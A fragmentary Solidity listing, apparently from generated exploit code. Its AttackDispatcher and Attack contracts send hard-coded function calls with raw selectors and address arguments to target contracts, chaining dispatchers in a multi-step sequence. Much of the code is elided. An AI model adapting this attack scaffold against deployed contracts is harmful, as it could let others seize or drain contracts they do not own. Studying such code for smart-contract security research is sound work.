    ...
    function _dispatch() public returns(bool) {
        ...
        if (state == 0) {
            if (id == 0) {
                 ...
                 */
                bytes memory data = abi.encodePacked(hex"4fb2e45d000000000000000000000000", (manager.__id_to_address(1)));
                uint value = 0x0;
            ...
            if (id == 1) {
                 ...
                 */
                bytes memory data = abi.encodePacked(hex"9d02a866000000000000000000000000", (manager.__id_to_address(4)));
                uint value = 0x0;
                address payable target = payable(targets[0 % targets.length]);
                emit Calling(state, target, address(this), value, data);
                (bool success, bytes memory retdata) = target.call{ value: value }(data);
                ...
                AttackDispatcher via = AttackDispatcher(manager.__id_to_address(1));
                via._dispatch();
            }
        }
...
contract Attack is AttackManager {
    ...
    function reset(address payable[] memory _targets) public onlyOwner payable {
        ...
        subs[1] = new AttackDispatcher{value: 0 }(1, _targets);
    }
